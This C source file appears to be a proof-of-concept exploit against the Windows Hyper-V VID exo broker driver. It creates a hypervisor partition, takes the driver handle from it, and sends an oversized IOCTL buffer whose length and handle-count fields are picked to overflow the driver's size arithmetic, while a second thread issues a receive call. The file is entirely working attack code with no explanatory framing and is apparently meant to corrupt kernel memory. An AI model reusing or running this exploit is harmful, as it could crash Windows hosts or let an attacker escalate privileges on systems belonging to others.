#include <stdio.h>
#include <Windows.h>
#include <WinHvPlatform.h>

#define SEND_IOCTL 0x221288
//VidExoBrokerIoctlSend

#define RECV_IOCTL 0x22128c
//VidExoBrokerIoctlReceive

#define INPUT_LEN 0xfffff000

typedef struct _BrokerIrpDataHeader {
	DWORD HeaderSize;
	DWORD NumHandles;
	DWORD DataOffset;
	DWORD DataLen;
}BrokerIrpDataHeader;

HANDLE VidExo;

DWORD WINAPI Receive() {

	char buf[0x20];
	Sleep(2000);

	if (!DeviceIoControl(VidExo, RECV_IOCTL, NULL, 0, buf, 0x20, NULL, NULL)) {
		printf("RECV_IOCTL failed(%x)\n", GetLastError());
	}

	return 0;
}

int
main()
{
	WHV_PARTITION_HANDLE prtn;
	WHV_CAPABILITY cap;
	unsigned int size, val;

	WHvGetCapability(WHvCapabilityCodeHypervisorPresent, &cap, sizeof(cap), &size);

	if (cap.HypervisorPresent == 0)
	{
		printf("Hypervisor is not present\n");
		return -1;
	}

	WHvCreatePartition(&prtn);

	val = 1;//processor cnt
	WHvSetPartitionProperty(prtn, WHvPartitionPropertyCodeProcessorCount, &val, sizeof(val));

	WHvSetupPartition(prtn);

	VidExo = (HANDLE)(*((__int64*)prtn + 1) & 0xfffffffffffffffe);

	DWORD NumHandles, DataLen;
	DataLen = 0xfffff000;
	NumHandles = (0x100000000 - 0x10 - DataLen) / sizeof(HANDLE);
	printf("DataLen: %x\nNumHandles: %x\n", DataLen, NumHandles);

	DWORD64* payload = VirtualAlloc(
		NULL,
		INPUT_LEN,
		MEM_RESERVE | MEM_COMMIT,
		PAGE_READWRITE
	);

	if (payload == NULL) {
		printf("VirtualAlloc Failed(%x)\n", GetLastError());
		WHvDeletePartition(prtn);
		return -1;
	}

	BrokerIrpDataHeader* hdr = payload;
	HANDLE proc = GetCurrentProcess();
	PHANDLE p = &hdr[1];

	hdr->HeaderSize = 0x10;
	hdr->NumHandles = NumHandles;
	hdr->DataLen = DataLen;
	hdr->DataOffset = 0x0;

	if (
		(INPUT_LEN < hdr->HeaderSize)
		|| (INPUT_LEN - hdr->HeaderSize) >> 3 < hdr->NumHandles
		|| INPUT_LEN < hdr->DataOffset
		|| INPUT_LEN - hdr->DataOffset < hdr->DataLen) {
		printf("No way...\n");
		goto CLEAN;
	}


	for (DWORD i = 0; i < NumHandles; i++) {
		*p = proc;
		p++;
	}

	CreateThread(
		NULL,
		0,
		Receive,
		NULL,
		0,
		NULL
	);

	if (!DeviceIoControl(VidExo, SEND_IOCTL, payload, INPUT_LEN, NULL, 0, NULL, NULL)) {
		printf("DeviceIoControl(SEND_IOCTL) Failed(%x)\n", GetLastError());
		goto CLEAN;
	}

CLEAN:
	VirtualFree(payload, INPUT_LEN, MEM_FREE);
	VirtualFree(payload, 0, MEM_RELEASE);
	WHvDeletePartition(prtn);
}